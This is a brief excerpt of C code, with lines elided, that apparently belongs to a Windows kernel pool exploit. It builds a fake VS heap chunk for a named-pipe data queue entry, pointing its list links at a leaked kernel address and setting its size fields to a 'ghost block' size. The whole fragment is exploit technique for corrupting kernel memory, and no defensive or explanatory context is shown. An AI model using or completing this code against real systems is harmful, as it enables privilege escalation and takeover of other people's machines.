...
void constructFakeVsChunk(exploit_addresses_t* addrs, uintptr_t vs_sub_segment)
{
    ...
    g_fake_process_billed_chunk.np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)addrs->np_cbb_data_queue;
    g_fake_process_billed_chunk.np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)addrs->np_cbb_data_queue;
    ...
    g_fake_process_billed_chunk.np_data_queue_entry.DataSize = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
    g_fake_process_billed_chunk.np_data_queue_entry.QuotaInEntry = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
